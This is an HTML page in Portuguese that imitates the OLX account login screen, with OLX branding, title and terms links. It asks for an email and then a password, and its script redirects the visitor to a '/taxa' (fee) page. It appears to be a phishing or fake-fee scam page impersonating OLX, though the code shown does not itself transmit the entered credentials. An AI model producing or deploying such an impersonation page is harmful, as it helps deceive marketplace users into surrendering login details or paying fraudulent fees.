<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charSet="utf-8"/>
    <meta name="theme-color" content="#000000"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
    <meta name="description" content="OLX - Rápido e Fácil pra comprar e desapegar. Vender e Comprar nunca foi tão fácil! Anuncie Online na OLX - Você tem alguma coisa para desapegar. Desapega!"/>
    <title>Minha conta | OLX</title>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="16x16" href="../img/favicon-16x16.png"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz@0,6..12;1,6..12&display=swap" rel="stylesheet">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow-x: hidden;
        }
        .logo {
            width: 47px;
            margin-top: 27px;
            margin-left: 73px;
        }
        .header {
            background-color: #fff;
            border-bottom: 1px solid #c7c7c7;
            padding-bottom: 21px;
        }
        .form-container {
            position: relative;
            background-color: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 6px 57px 87px 57px;
            width: 100%;
            overflow: hidden;
            text-align: center;
            max-height: 70vh;
            max-width: fit-content;
            margin-left: auto;
            margin-right: auto;
            margin-top: 47px;
            margin-bottom: 10px;
        }
        .form-container h1 {
            font-size: 20px;
            margin-bottom: 95px;
            font-size: 25px;
        }
        .form-container input[type="email"],
        .form-container input[type="password"] {
            width: 100%;
            padding: 15px 30px;
            margin: 15px 0;
            border: 1px solid #dcdcdc;
            border-radius: 8px;
            font-size: 14px;
            margin-top: -3px;
            margin-bottom: 21px;
            box-sizing: border-box;
        }
        .form-container label {
            display: block;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 5px;
            text-align: left;
            margin: 15px 0;
            font-size: 15px;
        }
        .form-container button {
            background-color: #f28000;
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 12px 32px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            margin-bottom: 50px;
            box-sizing: border-box;
        }
        .form-container button:hover {
            background-color: #e56c00;
        }
        .form-container .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #818181;
        }
        .form-container .divider::before,
        .form-container .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ddd;
        }
        .form-container .divider:not(:empty)::before {
            margin-right: 10px;
        }
        .form-container .divider:not(:empty)::after {
            margin-left: 10px;
        }
        .form-container .social-icons {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 40px;
        }
        .form-container .social-icons img {
            width: 60px;
            height: 60px;
            cursor: pointer;
        }
        .form-container a {
            color: #6e0ad6;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 10cm;
        }
        .form-container a:hover {
            text-decoration: underline;
        }
        .form-container .help {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #f1f1f1;
            text-align: center;
            padding: 10px 0;
            font-size: 14px;
            color: #333;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s, color 0.3s;
        }
        .form-container .help a {
            color: #000000;
            text-decoration: none;
            transition: color 0.3s;
        }
        .form-container .help:hover {
            background-color: #f5e7ff;
            color: #fff;
        }
        .form-container .help a:hover {
            color: #6a1b9a;
        }
        .continuar {
            font-size: 12px;
            color: #666;
            text-align: center;
            padding: 10px 20px;
            width: 100%;
            background-color: #f8f8f8;
            border-top: 1px solid #e0e0e0;
            margin-top: 20px;
        }
        body {
            font-family: 'Nunito Sans', sans-serif;
            background-color: #ffffff;
        }

        @media (max-width: 600px) {
            .form-container {
                padding: 20px;
                margin-top: 20px;
                margin-bottom: 20px;
            }
            .form-container h1 {
                font-size: 20px;
                margin-bottom: 40px;
            }
            .form-container button {
                padding: 10px 20px;
            }
            .form-container .social-icons {
                gap: 15px;
            }
            .form-container .help {
                font-size: 12px;
            }
            .continuar {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <nav>
            <div class="logo">
                <img src="../img/olx.svg" alt="olx-image">
            </div>
        </nav>
    </header>
    <div class="form-container">
        <h1>Acesse a sua conta</h1>
        <form id="login-form" action="javascript:void(0);">
            <label for="input-field" id="label">E-mail</label>
            <input type="email" id="input-field" placeholder=" " required>
            <button  type="submit" id="button-continue">Continuar</button>
        </form>
        <div class="divider">Ou conecte com</div>
        <div class="social-icons">
            <img src="../img/google-icon.png" alt="Google" class="google">
            <img src="../img/facebook-icon.png" alt="Facebook" class="facebook">
        </div>
        <div class="help">
            <a href="#">Preciso de ajuda</a>
        </div>
    </div>
    <div class="continuar">
        <p>Ao continuar, você concorda com os <a href="https://ajuda.olx.com.br/s/article/termos-e-condicoes-de-uso">Termos de Uso</a> e a <a href="https://ajuda.olx.com.br/s/article/politica-de-privacidade">Política de Privacidade</a></p>
        <p> da OLX e seus parceiros, e em receber comunicações da OLX.</p>
    </div>
    
    <script>
        document.getElementById("button-continue").addEventListener("click", function(event) {
    event.preventDefault();
    const inputField = document.getElementById("input-field");
    const label = document.getElementById("label");
    
    if (inputField.type === "email") {
        // Check if the email field is empty or does not contain '@'
        if (inputField.value === "" || !inputField.value.includes("@")) {
            label.style.color = "red";
            inputField.placeholder = "Campo Obrigatório";
            inputField.style.border = "1px solid red";
            inputField.style.backgroundColor = "#f2f2f2";
        } else {
            // Switch to password input if email is valid
            label.textContent = "Senha";
            inputField.type = "password";
            inputField.value = "";
            inputField.placeholder = "Digite sua senha"; // Added placeholder for password
            // Reset styles for email field
            label.style.color = "black"; // Reset label color
            inputField.style.border = "1px solid black"; // Reset border color
            inputField.style.backgroundColor = "#ffffff"; // Reset background color
        }
    } else if (inputField.type === "password") {
        // Check if the password field is empty
        if (inputField.value === "") {
            label.style.color = "red";
            inputField.placeholder = "Campo obrigatório";
            inputField.style.border = "1px solid red";
            inputField.style.backgroundColor = "#f2f2f2";
        } else {
            window.location.href = "/taxa"
        }
    }
});
    </script>
</body>
</html>
